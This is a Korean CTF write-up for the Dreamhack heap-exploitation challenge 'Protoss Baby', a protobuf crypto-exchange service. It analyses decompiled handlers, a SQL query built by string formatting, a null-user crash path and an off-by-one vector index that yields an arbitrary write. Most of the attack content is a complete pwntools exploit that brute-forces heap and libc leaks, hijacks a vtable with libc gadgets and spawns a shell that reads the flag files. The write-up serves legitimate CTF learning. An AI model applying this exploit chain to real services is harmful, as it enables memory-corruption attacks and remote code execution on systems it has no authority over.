# Protoss Baby
## Overview
`docker-compose.yml:`
```docker
version: '3.8'
services:
  db:
    image: mysql:8.0@sha256:fd8f47c32de2993a704627bffca9b64495c156ec6e85e0af4074cf908830a794
    restart: always
    environment:
      - MYSQL_ROOT_PASSWORD=protoss
      - MYSQL_USER=protoss
      - MYSQL_PASSWORD=protoss
      - MYSQL_DATABASE=protoss_db
    networks:
      - protossnet
    ports:
     - "3306:3306"
    container_name: db
  protoss:
    build: .
    restart: always
    ports:
      - "5050:5050"
    environment:
      - LD_LIBRARY_PATH=/home/user/libs
    networks:
      - protossnet
    depends_on:
      - db
    container_name: protoss
  
networks:
  protossnet:
```
DB로는 mysql을 사용하고, protoss 라는 문제의 이름처럼 protobuf를 사용하여 데이터를 직렬화 / 역직렬화 한다.

`init.sql:`
```sql
DROP DATABASE protoss_db;
CREATE DATABASE protoss_db;

USE protoss_db;
CREATE TABLE pt_account(
    acc_id BIGINT NOT NULL AUTO_INCREMENT PRIMARY KEY,
    username varchar(32) NOT NULL,
    password varchar(64) NOT NULL,
    unique(username)
);

CREATE TABLE pt_uservault(
    id BIGINT NOT NULL AUTO_INCREMENT PRIMARY KEY,
    acc_id BIGINT NOT NULL,
    KRW_amount BIGINT NOT NULL,
    BTC_amount BIGINT NOT NULL,
    ETH_amount BIGINT NOT NULL,
    XRP_amount BIGINT NOT NULL,
    SOL_amount BIGINT NOT NULL,
    timestamp BIGINT NOT NULL,
    unique(acc_id)
);

CREATE TABLE pt_coininfo (
    id BIGINT NOT NULL AUTO_INCREMENT PRIMARY KEY,
    symbol varchar(10),
    current_price BIGINT NOT NULL,
    qty BIGINT NOT NULL,
    unique(symbol)
);

INSERT INTO pt_coininfo VALUES (
    NULL,
    'BTC',
    50000000,
    10
);

INSERT INTO pt_coininfo VALUES (
    NULL,
    'ETH',
    2735000,
    100
);

INSERT INTO pt_coininfo VALUES (
    NULL,
    'XRP',
    863,
    10000
);

INSERT INTO pt_coininfo VALUES (
    NULL,
    'SOL',
    72000,
    1000
);


CREATE TABLE pt_tradehistory (
    id BIGINT NOT NULL AUTO_INCREMENT PRIMARY KEY,
    acc_id BIGINT NOT NULL,
    symbol varchar(10),
    price BIGINT NOT NULL, -- 매수/매도 금액
    amount BIGINT NOT NULL, -- 수량
    total_price BIGINT NOT NULL, -- 매수/매도 총 금액 
    type BIGINT NOT NULL,
    trade_time BIGINT,
    unique(trade_time)  -- 트레이딩봇 방지 (최소 수량 매수/매도 반복)
); 

CREATE TABLE pt_addressbook (
    id BIGINT NOT NULL AUTO_INCREMENT PRIMARY KEY,
    acc_id BIGINT NOT NULL,
    symbol varchar(10) NOT NULL,
    address varchar(255) NOT NULL,
    memo varchar(10) NOT NULL, 
    create_at BIGINT NOT NULL,
    unique(address, symbol, create_at)
); 
```
프로그램을 확인하기 전에, init.sql을 보면 계정 생성, 코인 매수, 매도, 주소록 등록 등의 기능이 존재할 것이라고 유추할 수 있다.

프로그램이 protobuf를 통해 입력을 받기 때문에 protobuf 형식에 맞춰 값을 전달해줘야 한다.
하지만 바이너리 내부 통신 방법을 일일히 분석하여 proto 파일을 만들기에는 불편하기 때문에 pbtk를 사용하였다: `https://github.com/marin-m/pbtk`

위 툴을 이용하면 다음과 같은 proto 파일을 얻을 수 있다.
`protoss.proto:`
```proto
syntax = "proto2";

package protoss;

message SignUp {
    required bytes username = 1;
    required bytes password = 2;
}

message SignUpResponse {
    required bytes username = 1;
    required uint64 acc_id = 3;
}

message SignIn {
    required bytes username = 1;
    required bytes password = 2;
}

message Deposit {
    required bytes address = 1;
    required Symbol symbol = 2;
    optional int64 memo = 3;
}

message Buy {
    required int64 symbol = 1;
    required uint64 amount = 2;
    optional uint64 timestamp = 3;
}

message Sell {
    required Symbol symbol = 1;
    required uint64 amount = 2;
    optional uint64 timestamp = 3;
}

message TradeResponse {
    required string symbol = 1;
    required uint64 coin_cur_price = 2;
    required uint64 amount = 3;
    required uint64 total_price = 4;
    required bool flag = 5;
}

message History {
    required Symbol symbol = 1;
    required uint64 type = 2;
    optional uint64 ts = 3;
}

message HistoryResponse {
    required uint64 id = 1;
    required string symbol = 2;
    required uint64 price = 3;
    required uint64 amount = 4;
    required uint64 total_price = 5;
    required bool type = 6;
    optional uint64 trade_time = 7;
}

message AddressBook {
    required Symbol symbol = 1;
    required bytes address = 2;
    optional bytes memo = 3;
    optional uint64 create_at_ts = 4;
}

message ModifyAddressBook {
    required int32 _id = 1;
    optional bytes origin_addr = 3;
    required bytes new_addr = 4;
    optional bytes memo = 5;
}

message AddressBookResponse {
    required bytes symbol = 1;
    required bytes address = 2;
    optional bytes memo = 3;
}

message ModifyAddressBookResponse {
    required uint32 id = 1;
    required bytes origin_addr = 2;
    required bytes new_addr = 3;
}

message ProtossInterface {
    required int32 event_id = 1;
    optional SignUp event_signup = 2;
    optional SignIn event_signin = 3;
    optional Deposit event_deposit = 4;
    optional Buy event_buy = 5;
    optional Sell event_sell = 6;
    optional History event_history = 7;
    optional AddressBook event_addressbook = 8;
    optional ModifyAddressBook event_modify_addressbook = 9;
}

enum Symbol {
    BTC = 0;
    ETH = 1;
    XRP = 2;
    ELF = 3;
}

```

위 proto 파일을 이용하여 python에서 값을 직렬화하기 위해서는 다음과 같은 방법으로 python proto module을 생성하면 된다.
```sh
pip install protobuf
protoc -I=. --python_out=. protoss.proto
```

동적으로 프로그램을 분석하다 보면, 특이한 부분들이 존재한다:
`handler:`
```cpp
void __noreturn handler()
{
  int fd; // [rsp+14h] [rbp-Ch]
  void *buf; // [rsp+18h] [rbp-8h]

  buf = operator new[](0x2800uLL);
  fd = open("/proc/self/maps", 0);
  read(fd, buf, 0x2800uLL);
  write(1, buf, 0x2800uLL);
  exit(-1);
}
```
11(SIGSEGV) 시그널을 위 핸들러를 통해 처리하고 있다. /proc/self/maps의 내용에 비해 과도한 사이즈인 0x2800 사이즈로 orw를 처리하는게 매우 수상했다.

`user_handler:`
```cpp
      case 0x10000002:
        User::handle_signout(user);
        v5 = user;
        if ( user )
        {
          User::~User(user);
          operator delete(v5, 0x38uLL);
        }
        user = 0LL;
        break;
```
유저 로그아웃 시 user 전역 변수에 null을 넣는다. 위 로직을 통해 user 전역 변수를 사용하는 타 함수들에서 SIGSEGV 시그널을 발생시킬 수 있다.

`handle_signin:`
```cpp
      std::format<std::string &,std::string &>(
        v15,
        63LL,
        "SELECT * FROM pt_account WHERE username='{}' AND password='{}';",
        v13,
        v14);
      v8 = client;
      std::string::basic_string(v16, v15);
      v11 = MySQLClient::exec_query_result(v8, v16);
      std::string::~string(v16);
      if ( v11 )
      {
        if ( mysql_num_fields(v11) == 3 )       // what
        {
          row = mysql_fetch_row(v11);
          *(this + 2) = atoi(*row);
          std::string::operator=(this + 16, row[1]);
          *(this + 13) = atoi(row[3]);
          *(this + 12) = 1;
          v4 = 0;
        }
        else
        {
          v4 = -1;
        }
      }
```
쿼리를 수행한 후, `mysql_num_fields(v11) == 3` 를 통해 조건을 검사하는데, 이는 쿼리의 성공 여부와 무관하게 항상 참이 된다. 위 로직을 통해서도 SIGSEGV 시그널을 발생시킬 수 있다.

위 취약점들을 조합하여 `Protoss Baby`를 해결할 수 있을 것 같았지만, 목표는 두 문제 모두 해결하는 것이었기 때문에 read/write primitive를 찾는 데에 몰두하였다.
결국 write primitive를 찾았다:
`modify_all_address:`
```cpp
          while ( 1 )
          {
            address = mysql_fetch_row(v18);
            if ( !address )
              break;
            LODWORD(id) = atoi(*address);
            std::vector<int>::push_back(&id_vec, &id);// index is 1, 2, 3 ...
            p_id = &id;
            std::string::basic_string<std::allocator<char>>(new_addr, address[1], &id);
            std::vector<std::string>::push_back(&addr_vec, new_addr);
            std::string::~string(new_addr);
          }
          p_id_vec = &id_vec;
          v16 = std::vector<int>::begin(&id_vec);
          id = std::vector<int>::end(p_id_vec);
          while ( !__gnu_cxx::operator==<int *,std::vector<int>>(&v16, &id) )
          {
            v15[0] = *__gnu_cxx::__normal_iterator<int *,std::vector<int>>::operator*(&v16);
            v5 = std::ostream::operator<<(&std::cout, v15[0]);
            std::ostream::operator<<(v5, &std::endl<char,std::char_traits<char>>);
            v6 = std::vector<std::string>::operator[](&addr_vec, v15[0]);
            std::string::operator=(v6, a2);     // write primitive
```
모든 주소록을 한 번에 수정하는 과정에서 주소록 벡터, 인덱스 벡터 총 두 개의 벡터를 생성하여 인덱싱을 진행하는데, 인덱스 벡터가 0부터 시작하는게 아닌 1부터 시작하여 다음과 같은 취약점이 발생한다:
```cpp
SQL:
    1    XRP    MYADDR
    2    BTC    MYADDR2
    3    XRP    MYADDR3
    4    SOL    MYADDR4

Vulnerability:
    std::vector<std::string> addr_vec[4] = {"MYADDR", "MYADDR2", "MYADDR3", "MYADDR4"};
    std::vector<int> id_vec[4]           = {1, 2, 3, 4};
    
    std::cout << addr_vec[id_vec[0]] << std::endl; // MYADDR2
    std::cout << addr_vec[id_vec[1]] << std::endl; // MYADDR3
    std::cout << addr_vec[id_vec[2]] << std::endl; // MYADDR4
    std::cout << addr_vec[id_vec[3]] << std::endl; // ?
```

## Solution
cpp 내부 malloc이 heap 내부 값을 초기화하지 않는다는 점을 이용하여 write primitive를 통해 offset을 일부 조작하여 AAW를 진행할 수 있다.
릭을 할 수 있는 취약점은 발견하지 못했기 때문에, heap에 할당되는 user의 주소를 brute force를 통해 유추하여 릭을 진행하였다.
user의 Username은 std::string이기 때문에, 힙 내부에서 Username.length를 변조하여 아래 함수에서 heap과 libc를 한 번에 릭할 수 있다.
`handle_my_info:`
```cpp
__int64 __fastcall User::handle_my_info(User *this)
{
  v2 = std::operator<<<std::char_traits<char>>(&std::cout, "idx: ");
  v3 = std::ostream::operator<<(v2, *(this + 2));
  std::ostream::operator<<(v3, &std::endl<char,std::char_traits<char>>);
  v4 = std::operator<<<std::char_traits<char>>(&std::cout, "Username: ");
  v5 = std::operator<<<char>(v4, this + 0x10);
  std::ostream::operator<<(v5, &std::endl<char,std::char_traits<char>>);
  v6 = std::operator<<<std::char_traits<char>>(&std::cout, "Amount: ");
  v7 = std::ostream::operator<<(v6, *(this + 13));
  std::ostream::operator<<(v7, &std::endl<char,std::char_traits<char>>);
}
```

최종적으로 쉘을 얻기 위하여 user 구조체의 vtable을 변조한 후, 아래의 함수를 부르면 된다.
`Exchange::handle_sell:`
```cpp
          *(this + 1) = atoi(*row);
          v5 = *(*user + 8LL);
          v6 = user;
          std::string::basic_string(v24, v22);
          LOBYTE(v6) = v5(v6, v24, v17) ^ 1;
```
다만, this를 첫 번째 인자로 전달하는데, 이는 vtable의 위치기 때문에 인자 컨트롤이 어렵다.
이를 적당한 가젯을 찾아 /bin/sh가 들어갈 수 있도록 조작해주면 된다.

exploit을 약 30분 정도 돌리다 보면, 아래와 같이 쉘을 얻을 수 있다.
![image.png](https://dreamhack-media.s3.amazonaws.com/attachments/d6caae49bf48c5989804c2eeadcf17b20cbc02baa8891b19f114651762ba6cf6.png)

`ex.py:`
```py
#! /usr/bin/python3

from pwn import *
from subprocess import check_output
from enum import Enum, auto
import array
from datetime import datetime
import string
import protoss_pb2
import sys

DREAMHACK_PORT = 9133
PROTOSS_PORT = 5050
MYSQL_PORT = 3306
DEBUG_PORT = 22244
BINARY_PATH = "./protoss"
REMOTE = True

class UserEvent(Enum):
    SIGNUP = 0x10000000
    SIGNIN = auto()
    SIGNOUT = auto()
    MYINFO = auto()

class ExchangeEvent(Enum):
    BUY = 0x20000000
    SELL = auto()
    HISTORY = auto()
    ADD_ADDRESSBOOK = auto()
    MODIFYADDRESSBOOK = auto()
    DEL_ADDRESSBOOK = auto()
    DEPOSIT = auto()

class Type(Enum):
    BUY = 1
    SELL = 0

# s = connect('localhost', PROTOSS_PORT)
s = connect('host3.dreamhack.games', DREAMHACK_PORT)
e = ELF(BINARY_PATH)
l = ELF('./libs/libc.so.6')

def db(gs):
    check_output('./run_attach_process.sh')
    gdb.attach(target=('localhost', DEBUG_PORT), exe=BINARY_PATH, gdbscript=gs)
    pause()

def swap(data):
    arr = array.array('h', data)
    arr.byteswap()
    data = bytearray(arr)
    return data

def get_timestamp():
    return int(datetime.now().timestamp())

def stringToSymbol(symbol_type):
    if symbol_type == "BTC":
        return protoss_pb2.Symbol.BTC
    elif symbol_type == "ETH":
        return protoss_pb2.Symbol.ETH
    elif symbol_type == "XRP":
        return protoss_pb2.Symbol.XRP
    elif symbol_type == "ELF":
        return protoss_pb2.Symbol.ELF
    else:
        print("Unknown symbol type; leaving as default value.")
        return protoss_pb2.Symbol.BTC

def writeProto(event_id, signup="", signin="", \
                deposit="", buy="", sell="", \
                history="", addressbook="", modify_addressbook=""):
    protoss = protoss_pb2.ProtossInterface()

    protoss.event_id = int(event_id)

    if signup:
        protoss.event_signup.username = signup['username']
        protoss.event_signup.password = signup['password']
    
    if signin:
        protoss.event_signin.username = signin['username']
        protoss.event_signin.password = signin['password']
    
    if deposit:
        protoss.event_deposit.address = deposit['address']
        protoss.event_deposit.symbol = stringToSymbol(deposit['symbol'])
        if deposit['memo']:
            protoss.event_deposit.memo = int(deposit['memo'])

    if buy:
        protoss.event_buy.symbol = stringToSymbol(buy['symbol'])
        protoss.event_buy.amount = int(buy['amount'])
        if buy['timestamp']:
            protoss.event_buy.timestamp = int(buy['timestamp'])
    
    if sell:
        protoss.event_sell.symbol = stringToSymbol(sell['symbol'])
        protoss.event_sell.amount = int(sell['amount'])
        if sell['timestamp']:
            protoss.event_sell.timestamp = int(sell['timestamp'])
    
    if history:
        protoss.event_history.symbol = stringToSymbol(history['symbol'])
        protoss.event_history.type = int(history['type'])
        if history['ts']:
            protoss.event_history.ts = int(history['ts'])
    
    if addressbook:
        protoss.event_addressbook.symbol = stringToSymbol(addressbook['symbol'])
        protoss.event_addressbook.address = addressbook['address']
        if addressbook['memo']:
            protoss.event_addressbook.memo = addressbook['memo']
        if addressbook['create_at_ts']:
            protoss.event_addressbook.create_at_ts = int(addressbook['create_at_ts'])

    if modify_addressbook:
        protoss.event_modify_addressbook._id = int(modify_addressbook['_id'])
        protoss.event_modify_addressbook.origin_addr = modify_addressbook['origin_addr']
        protoss.event_modify_addressbook.new_addr = modify_addressbook['new_addr']
        protoss.event_modify_addressbook.memo = modify_addressbook['memo']

    return protoss.SerializeToString()

class UserClass:
    @staticmethod
    def signup(username, password):
        s.sendafter("> ", writeProto(UserEvent.SIGNUP.value, signup={
            "username": username,
            "password": password
        }))

    @staticmethod
    def signin(username, password):
        s.sendafter("> ", writeProto(UserEvent.SIGNIN.value, signin={
            "username": username,
            "password": password
        }))

    @staticmethod
    def signout():
        s.sendafter("> ", writeProto(UserEvent.SIGNOUT.value))

    @staticmethod
    def myinfo():
        s.sendafter("> ", writeProto(UserEvent.MYINFO.value))

class ExchangeClass:
    @staticmethod
    def buy(symbol, amount, timestamp):
        s.sendafter("> ", writeProto(ExchangeEvent.BUY.value, buy={
            "symbol": symbol,
            "amount": amount,
            "timestamp": timestamp
        }))

    @staticmethod
    def sell(symbol, amount, timestamp):
        s.sendafter("> ", writeProto(ExchangeEvent.SELL.value, sell={
            "symbol": symbol,
            "amount": amount,
            "timestamp": timestamp
        }))

    @staticmethod
    def history(symbol, _type, ts):
        s.sendafter("> ", writeProto(ExchangeEvent.HISTORY.value, history={
            "symbol":symbol,
            "type":_type,
            "ts":ts
        }))

    @staticmethod
    def add_addressbook(symbol, address, memo, create_at_ts):
        s.sendafter("> ", writeProto(ExchangeEvent.ADD_ADDRESSBOOK.value, addressbook={
            "symbol":symbol,
            "address":address,
            "memo":memo,
            "create_at_ts":create_at_ts
        }))

    @staticmethod
    def modify_addressbook(_id, origin_addr, new_addr, memo):
        s.sendafter("> ", writeProto(ExchangeEvent.MODIFYADDRESSBOOK.value, modify_addressbook={
            "_id":_id,
            "origin_addr":origin_addr,
            "new_addr":new_addr,
            "memo":memo
        }))

    @staticmethod
    def del_addressbook(symbol, address, memo, create_at_ts):
        pass
    
    @staticmethod
    def deposit(address, symbol, memo):
        pass

# context.log_level = 'debug'

while True:
    # db("""
    # b* 'Exchange::handle_buy(protoss::Buy const&) '+0x39C
    # b* 'User::handle_signin(protoss::SignIn const&) '+0x2BF
    # b* 'modify_all_address(std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >, std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >) '+0x376
    # b* 'modify_all_address(std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >, std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >) '+0x446
    # b* 'Exchange::handle_buy(protoss::Buy const&)' +0x2C7
    # b* 'Exchange::handle_sell(protoss::Sell const&) '+0x260
    # """)

    UserClass.signup(b"A"*0x20, b"B"*0x20)
    UserClass.signin(b"A"*0x20, b"B"*0x20)

    for i in range(4):
        ExchangeClass.add_addressbook("XRP", b"MYADDRESS", b"123123", str(i+2))

    ExchangeClass.add_addressbook("XRP", b"A"*0x80+p16(0x31b0+8), b"123123", str(i+2))
    ExchangeClass.modify_addressbook("-1", b"MYADDRESS", p16(0x1000), b"memo")


    # db('')
    try:
        UserClass.myinfo()
        s.recvuntil('Username: ')
        data = s.recv(0x30)
        print(data)
        if b'Amount' in data:
            raise
    except:
        s.close()
        # s = connect('localhost', PROTOSS_PORT)
        s = connect('host3.dreamhack.games', DREAMHACK_PORT)
        continue


    leak = s.recv(6).ljust(8, b'\x00')
    if REMOTE:
        heap = u64(leak) - 0x113370
        heap -= 0x9100 # remote offset
        log.info(f"heap: {hex(heap)}")

        libc = u64(s.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) + 0xa7b20
        log.info(f"libc: {hex(libc)}")
    else:
        libc = u64(leak) + 0xea0e8
        log.info(f"libc: {hex(libc)}")
        s.recv(0x10+2)
        leak = s.recv(6).ljust(8, b'\x00')
        heap = u64(leak) - 0x112e70
        log.info(f"heap: {hex(heap)}")

    context.log_level = 'debug'
    system = libc + l.symbols['system']
    binsh = libc + next(l.search(b'/bin/sh'))
    log.info(f"system: {hex(system)}")
    log.info(f"binsh: {hex(binsh)}")

    user = heap + 0x191a0
    system_heap = user + 0x100
    log.info(f'user: {hex(user)}')
    log.info(f'system_heap: {hex(system_heap)}')

    cmd = b"1;sh;111"
    # 0x94924: detected sql injection: chr(0x24)
    gadget = libc + 0x0000000000094926 # : add BYTE PTR [rax],al ; mov rdi, qword ptr [rbx + 0x648] ; call qword ptr [rbx + 0x640]
    gadget2 = libc + 0x000000000008fff4 # : call qword ptr [rbx + 0x360] # stack pivoting

    ExchangeClass.add_addressbook("XRP", b"A"*0x100 + p64(gadget), b"123123", str(i+2))
    ExchangeClass.add_addressbook("XRP", b"C"*0x80+p64(user).strip(b'\x00'), b"123123", str(i+2))
    ExchangeClass.modify_addressbook("-1", b"MYADDRESS", p64(system_heap-0x8).strip(b'\x00'), b"memo")

    ExchangeClass.add_addressbook("XRP", b"C"*0x80+p64(user+0x360 - 0x10).strip(b'\x00')+b"A", b"123123", str(i+2)) # null prevention
    ExchangeClass.add_addressbook("XRP", b"C"*0x80+p64(user+0x360 - 0x10).strip(b'\x00'), b"123123", str(i+2)) # null prevention
    ExchangeClass.modify_addressbook("-1", b"MYADDRESS", b"A"*0x10+p64(system).strip(b'\x00'), b"memo")

    ExchangeClass.add_addressbook("XRP", b"C"*0x80+p64(user+0x648).strip(b'\x00')+b"A", b"123123", str(i+2))
    ExchangeClass.add_addressbook("XRP", b"C"*0x80+p64(user+0x648).strip(b'\x00'), b"123123", str(i+2))
    ExchangeClass.modify_addressbook("-1", b"MYADDRESS", p64(binsh).strip(b'\x00'), b"memo")

    ExchangeClass.add_addressbook("XRP", b"C"*0x80+p64(user+0x640).strip(b'\x00')+b"A", b"123123", str(i+2))
    ExchangeClass.add_addressbook("XRP", b"C"*0x80+p64(user+0x640).strip(b'\x00'), b"123123", str(i+2))
    ExchangeClass.modify_addressbook("-1", b"MYADDRESS", p64(gadget2).strip(b'\x00'), b"memo")

    ExchangeClass.add_addressbook("XRP", b"C"*0x80+p64(user+0x100).strip(b'\x00')+b"A", b"123123", str(i+2))
    ExchangeClass.add_addressbook("XRP", b"C"*0x80+p64(user+0x100).strip(b'\x00'), b"123123", str(i+2))
    ExchangeClass.modify_addressbook("-1", b"MYADDRESS", p64(gadget).strip(b'\x00'), b"memo")

    ExchangeClass.add_addressbook("XRP", b"C"*0x80+p64(user+0x10).strip(b'\x00')+b"A", b"123123", str(i+2))
    ExchangeClass.add_addressbook("XRP", b"C"*0x80+p64(user+0x10).strip(b'\x00'), b"123123", str(i+2))
    ExchangeClass.modify_addressbook("-1", b"MYADDRESS", p64(system_heap).strip(b'\x00'), b"memo")
    UserClass.myinfo()

    ExchangeClass.add_addressbook("XRP", b"C"*0x80+p64(user+0x10).strip(b'\x00')+b"A", b"123123", str(i+2))
    ExchangeClass.add_addressbook("XRP", b"C"*0x80+p64(user+0x10).strip(b'\x00'), b"123123", str(i+2))
    ExchangeClass.modify_addressbook("-1", b"MYADDRESS", p64(user).strip(b'\x00'), b"memo")
    UserClass.myinfo()

    ExchangeClass.sell("XRP", str(1), "100")
    
    s.sendline('pwd')
    s.sendline('id')
    s.sendline('ls /')
    s.sendline('ls')
    s.sendline('cat /flag_1')
    s.sendline('cat /flag_2')
    s.interactive()
    exit()
```1